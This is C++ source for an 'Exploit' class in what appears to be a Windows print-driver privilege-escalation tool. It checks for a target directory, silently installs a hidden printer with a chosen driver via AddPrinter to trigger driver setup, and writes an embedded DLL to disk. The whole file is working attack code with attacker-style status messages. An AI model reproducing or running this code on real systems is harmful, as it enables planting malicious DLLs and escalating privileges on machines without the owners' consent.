#include "exploit.h"

#include <Windows.h>
#include <iostream>
#include <filesystem>
#include <fstream>

Exploit::Exploit(const std::string& p_driveName, const std::string& p_exploitName) :
	m_driverName(p_driveName),
    m_exploitName(p_exploitName)
{
}

Exploit::~Exploit()
{
}

const std::string& Exploit::get_driver_name() const
{
	return m_driverName;
}

bool Exploit::initialize_attack_space(const std::string& p_target_directory) const
{
    std::cout << "[+] Starting " << m_exploitName << std::endl;
    std::cout << "[+] Checking if " << p_target_directory << " exists" << std::endl;

    if (std::filesystem::exists(p_target_directory))
    {
        return true;
    }

    std::cout << "[-] Target directory doesn't exist. Trigger install. " << std::endl;
    install_printer();

    bool result = std::filesystem::exists(p_target_directory);
    if (!result)
    {
        std::cout << "[-] Failed to create " << p_target_directory << std::endl;
    }
    return result;
}

bool Exploit::drop_dll_to_disk(const std::string& p_dll_path, const unsigned char* p_dll_bytes, std::size_t p_dll_length) const
{
    std::cout << "[+] Dropping " << p_dll_path << " to disk" << std::endl;
    std::ofstream dll_out(p_dll_path, std::ofstream::out | std::ofstream::binary | std::ofstream::trunc);
    if (!dll_out.is_open())
    {
        std::cerr << "[!] Couldn't write the dll to disk." << std::endl;
        return false;
    }

    for (std::size_t i = 0; i < p_dll_length; i++)
    {
        dll_out << p_dll_bytes[i];
    }

    dll_out.flush();
    dll_out.close();
    return true;
}

bool Exploit::install_printer() const
{
    std::cout << "[+] Installing printer" << std::endl;

    std::wstring wdriver(m_driverName.begin(), m_driverName.end());
    std::wstring wName(m_exploitName.begin(), m_exploitName.end());

    PRINTER_INFO_2 printerInfo = { };
    ZeroMemory(&printerInfo, sizeof(printerInfo));
    printerInfo.pPortName = (LPWSTR)L"lpt1:";
    printerInfo.pDriverName = (LPWSTR)wdriver.c_str();
    printerInfo.pPrinterName = (LPWSTR)wName.c_str();
    printerInfo.pPrintProcessor = (LPWSTR)L"WinPrint";
    printerInfo.pDatatype = (LPWSTR)L"RAW";
    printerInfo.pComment = (LPWSTR)L"Concealed Position";
    printerInfo.pLocation = (LPWSTR)L"Underdark";
    printerInfo.Attributes = PRINTER_ATTRIBUTE_RAW_ONLY | PRINTER_ATTRIBUTE_HIDDEN;
    printerInfo.AveragePPM = 9001;
    HANDLE hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printerInfo);
    if (hPrinter == 0)
    {
        std::cerr << "[-] Failed to create printer: " << GetLastError() << std::endl;
        return false;
    }

    DeletePrinter(hPrinter);
    ClosePrinter(hPrinter);
    return true;
}